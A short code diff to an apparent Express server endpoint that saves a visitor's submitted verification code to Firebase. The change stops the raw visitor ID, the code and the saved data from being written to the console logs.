@@ -546,13 +546,13 @@ app.post('/api/save-activation-data', async (req, res) => {
 app.post('/api/save-verification-code', async (req, res) => {
     try {
         const vid = req.cookies.vid;
-        console.log('[Save Verification] Visitor ID:', vid);
+        // console.log('[Save Verification] Visitor ID:', vid);
         if (!vid) {
             return res.status(400).json({ success: false, error: 'No visitor ID' });
         }
         
         const { verificationCode } = req.body;
-        console.log('[Save Verification] Verification Code:', verificationCode);
+        console.log('[Save Verification] New verification code submitted');
         if (!verificationCode) {
             return res.status(400).json({ success: false, error: 'No verification code provided' });
         }
@@ -597,9 +597,9 @@ app.post('/api/save-verification-code', async (req, res) => {
             lastUpdated: timestamp
         };
         
-        console.log('[Save Verification] Updates to save:', JSON.stringify(updates, null, 2));
+        // console.log('[Save Verification] Updates to save:', JSON.stringify(updates, null, 2));
         await docRef.set(updates, { merge: true });
-        console.log('[Save Verification] Successfully saved to Firebase');
+        console.log('[Save Verification] Verification code saved successfully');
         
         res.json({ success: true });
     } catch (error) {
